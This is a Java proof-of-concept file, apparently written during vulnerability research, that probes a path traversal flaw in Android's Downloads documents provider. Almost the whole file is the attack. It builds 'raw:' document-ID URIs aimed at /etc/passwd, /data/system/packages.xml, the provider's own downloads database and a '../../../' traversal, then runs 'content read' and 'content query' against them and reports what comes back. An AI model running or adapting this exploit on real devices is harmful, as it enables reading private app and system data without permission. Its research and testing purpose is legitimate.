import android.net.Uri;
import android.os.IBinder;
import java.lang.reflect.Method;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;

public class QuickTest {
    public static void main(String[] args) throws Exception {
        System.out.println("[*] V-33 DownloadStorageProvider Path Traversal — Quick Test");
        System.out.println("[*] UID: " + android.os.Process.myUid());
        System.out.println();

        // The vulnerability: raw:<path> docId gets substring'd without validation
        // URI format: content://com.android.providers.downloads.documents/document/raw%3A<path>

        String[][] testCases = {
            {"raw:/etc/hosts", "/etc/hosts (world-readable)"},
            {"raw:/system/etc/hosts", "/system/etc/hosts"},
            {"raw:/proc/self/cmdline", "/proc/self/cmdline (provider process info)"},
            {"raw:/data/data/com.android.providers.downloads/databases/downloads.db", "downloads.db (provider's own DB)"},
        };

        // Method 1: Try via ContentResolver using ServiceManager
        System.out.println("=== Testing via direct ContentProvider call ===");
        System.out.println("(Using shell UID — actual app would need URI permission grant)");
        System.out.println();

        Class<?> smClass = Class.forName("android.os.ServiceManager");
        Method getService = smClass.getDeclaredMethod("getService", String.class);

        // Get ActivityManager to get ContentProvider
        IBinder amBinder = (IBinder) getService.invoke(null, "activity");

        for (String[] tc : testCases) {
            String docId = tc[0];
            String desc = tc[1];
            String encodedDocId = docId.replace("/", "%2F").replace(":", "%3A");
            String uri = "content://com.android.providers.downloads.documents/document/" + encodedDocId;

            System.out.println("[*] Testing: " + desc);
            System.out.println("    DocId: " + docId);
            System.out.println("    URI: " + uri);

            // Use content command approach via Runtime.exec
            try {
                Process proc = Runtime.getRuntime().exec(new String[]{
                    "content", "read", "--uri", uri
                });
                InputStream is = proc.getInputStream();
                InputStream es = proc.getErrorStream();
                byte[] buf = new byte[512];

                // Read stdout
                int len = is.read(buf);
                if (len > 0) {
                    String output = new String(buf, 0, Math.min(len, 200));
                    System.out.println("    [+] READ SUCCESS: " + output.replace("\n", "\\n").substring(0, Math.min(output.length(), 100)));
                } else {
                    // Read stderr
                    len = es.read(buf);
                    if (len > 0) {
                        String error = new String(buf, 0, Math.min(len, 200));
                        if (error.contains("SecurityException") || error.contains("Permission")) {
                            System.out.println("    [x] PERMISSION DENIED");
                        } else if (error.contains("FileNotFound") || error.contains("EACCES")) {
                            System.out.println("    [x] FILE ACCESS DENIED (Linux permissions)");
                        } else {
                            System.out.println("    [x] ERROR: " + error.substring(0, Math.min(error.length(), 100)));
                        }
                    } else {
                        System.out.println("    [?] EMPTY response");
                    }
                }
                proc.destroy();
            } catch (Exception e) {
                System.out.println("    [x] Exception: " + e.getMessage());
            }
            System.out.println();
        }

        // Method 2: Test query() to see if path traversal works at metadata level
        System.out.println("=== Testing metadata query (does the provider accept the raw: docId?) ===");
        System.out.println();

        String[] queryPaths = {
            "raw:/etc/hosts",
            "raw:/etc/passwd",
            "raw:/../../../etc/hosts",   // double-check relative path
            "raw:/data/system/packages.xml",
        };

        for (String docId : queryPaths) {
            String encodedDocId = docId.replace("/", "%2F").replace(":", "%3A");
            String uri = "content://com.android.providers.downloads.documents/document/" + encodedDocId;
            try {
                Process proc = Runtime.getRuntime().exec(new String[]{
                    "content", "query", "--uri", uri
                });
                InputStream is = proc.getInputStream();
                byte[] buf = new byte[1024];
                int len = is.read(buf);
                if (len > 0) {
                    String out = new String(buf, 0, Math.min(len, 200));
                    System.out.println("[+] query(" + docId + ") => " + out.substring(0, Math.min(out.length(), 120)));
                } else {
                    InputStream es = proc.getErrorStream();
                    len = es.read(buf);
                    String err = len > 0 ? new String(buf, 0, Math.min(len, 100)) : "empty";
                    System.out.println("[x] query(" + docId + ") => " + err);
                }
                proc.destroy();
            } catch (Exception e) {
                System.out.println("[x] query(" + docId + ") => " + e.getMessage());
            }
        }

        System.out.println();
        System.out.println("=== Key Question: Can an unprivileged app get URI grant for raw: docId? ===");
        System.out.println("DocumentsProvider normally requires SAF (ACTION_OPEN_DOCUMENT) for URI grants.");
        System.out.println("But the raw: prefix is used for files not in the downloads DB,");
        System.out.println("so they may appear in directory listings or be directly constructable.");
        System.out.println();
        System.out.println("=== Test Complete ===");
    }
}
